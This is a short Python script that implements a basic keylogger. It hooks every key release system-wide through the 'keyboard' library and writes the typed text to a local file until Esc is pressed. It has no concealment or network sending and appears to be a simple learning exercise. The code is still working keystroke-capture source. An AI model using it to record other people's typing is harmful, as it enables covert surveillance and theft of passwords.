import keyboard

class KeyLogger():
    def __init__(self, filename):
        self.log_file = open(filename, "w+")
        self.log_file.seek(0)
        self.log_file.truncate()
    
    def ReadKey(self, key):
        print_key = key.name
        if print_key in ["ctrl", "right ctrl", "shift", "right shift", "esc"]:
            print_key = ""
        match print_key:
            case "space": 
                print_key = " "
            case "enter": 
                print_key = "\n"
            case "backspace":
                self.log_file.seek(0)
                data = self.log_file.read()
                data = data[:-1]
                self.log_file.seek(0)
                self.log_file.truncate()
                print_key = data
        self.log_file.write(print_key)
        self.log_file.flush()

    def StartLog(self):
        keyboard.on_release(callback = self.ReadKey)
        keyboard.wait("esc")

def main():
    key_log = KeyLogger(input("enter name of output text: "))
    key_log.StartLog()


if __name__ == "__main__":
    main()